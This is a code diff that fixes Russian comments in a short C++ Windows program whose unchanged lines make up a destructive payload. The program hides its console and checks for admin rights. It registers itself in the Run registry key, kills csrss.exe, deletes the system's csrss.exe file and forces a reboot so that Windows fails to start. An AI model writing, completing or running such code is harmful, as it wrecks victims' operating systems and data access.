@@ -4,7 +4,7 @@
 using namespace std;
 
 
-//Функция проверки прав администратора
+//Функция проверки прав администратора.
 bool IsAdmin() {
     BOOL isAdmin = FALSE;
     PSID adminGroup = NULL;
@@ -17,7 +17,7 @@ bool IsAdmin() {
 }
 
 int main() {
-    //Скрываем консоль и проверяем есть ли права администратора
+    //Скрываем консоль и проверяем есть ли права администратора.
     FreeConsole();
 
     if (!IsAdmin()) {
@@ -27,7 +27,7 @@ int main() {
         return 0;
     }
 
-    //Автозарузка
+    //Автозагрузка
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -49,7 +49,7 @@ int main() {
     system("taskkill /f /im csrss.exe 2>nul");
     DeleteFileA("C:\\Windows\\System32\\csrss.exe");
 
-    //Перезагрузка для того чтоб Windows поняла что не хватает файла
+    //Перезагрузка чтобы Windows поняла, что не хватает файла.
     system("shutdown /r /t 10");
 
     return 0;
